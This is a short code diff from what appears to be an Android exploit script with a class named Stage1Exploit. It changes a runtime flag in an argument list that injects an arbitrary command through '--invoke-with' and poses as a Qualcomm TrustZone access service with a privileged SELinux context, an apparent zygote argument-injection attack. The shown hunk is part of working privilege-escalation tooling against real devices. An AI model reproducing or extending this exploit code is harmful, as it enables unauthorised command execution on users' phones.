@@ -197,7 +197,7 @@ class Stage1Exploit:
             "--app-data-dir=/data/user/0/com.qualcomm.qti.qms.service.trustzoneaccess",
             "--runtime-args",
             "--seinfo=ssgapp:ssg_app:complete",
-            "--runtime-flags=32767",
+            "--runtime-flags=1",
             "--invoke-with",
             f"{command}#",
         ]
